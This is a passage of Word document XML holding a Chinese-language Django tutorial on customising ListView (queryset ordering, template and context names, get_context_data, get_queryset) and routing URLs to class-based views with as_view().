        <w:t># 展示所有文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F254FD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D23097" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    queryset = Article.objects.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389F9F4E" w14:textId="3CB32D00" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'blog/article_list.html', {"object_list": queryset})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAF42C2" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>尽管我们只写了一行model = Article, ListView实际上在背后做了很多事情：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A0FB00" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>提取了需要显示的对象列表或数据集queryset: Article.objects.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC9DF68" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>指定了用来显示对象列表的模板名称(template name): 默认app_name/model_name_list.html, 即blog/article_list.html.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118C594C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>指定了内容对象名称(context object name):默认值object_list</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504A7B25" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54631FAB" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ListView的自定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C2CC2B" w14:textId="5A9EF7A8" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="411F80C9" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你或许已经注意到了2个问题：需要显示的文章对象列表并没有按发布时间逆序排列，内容对象名称object_list也不友好。或许你也不喜欢默认的模板名字，还希望通过这个视图给模板传递额外的内容(比如现在的时间)。你可以轻易地通过重写queryset, template_name和context_object_name来完成ListView的自定义。如果你还需要传递模型以外的内容，比如现在的时间，你还可以通过重写get_context_data方法传递额外的参数或内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45EB1428" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AED2A9C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FE37B4"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41BFCBD6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B208F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="387F068F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class IndexView(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269842FE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D9814F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    queryset = Article.objects.all().order_by("-pub_date")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375E348E"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'blog/article_list.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5898DA35" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    context_object_name = 'latest_articles'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A27CBB1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A0EFB31" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_context_data(self, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470D70B4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context = super().get_context_data(**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2794FAAD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context['now'] = timezone.now()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709C7FE6" w14:textId="69A98660" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE39570" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果上述的queryset还不能满足你的要求，比如你希望一个用户只看到自己发表的文章清单，你可以通过更具体的get_queryset方法来返回一个需要显示的对象列表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D290C45" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398AC0B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35698504"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00A6FC75" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE45334" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63850FF2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class IndexView(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58287EC8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76B345E4"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'blog/article_list.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D2016A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    context_object_name = 'latest_articles'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B861161" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20CED898" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_queryset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1A876E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return Article.objects.filter(author=self.request.user).order_by('-pub_date')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274C3A7F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18CA3024" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_context_data(self, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F79BE78" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context = super().get_context_data(**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73521CEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        context['now'] = timezone.now()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE8BF55" w14:textId="6C8CDEF4" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B00EAF4" w14:textId="302C3AF7" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DB3A176" w14:textId="50F6ACF0" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>URL如何指向基于类的视图(View)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0DF9F6" w14:textId="1ECDF16D" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="193B041F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>目前urls.py里path和re_path都只能指向视图view里的一个函数或方法，而不能指向一个基于类的视图(Class Based View)。Django提供了一个额外as_view()方法，可以将一个类伪装成方法。这点在当你使用Django在带的view类或自定义的类时候非常重要。更多内容见Django基础技术知识(2)</w:t>
      </w:r>
      <w:hyperlink r:id="rId243" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>URL的设计与配置</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0819E41E" w14:textId="4F4614EB" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="645117FB" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>具体使用方式如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B3594C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7D4E94" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D09C28" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AAD6ABD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
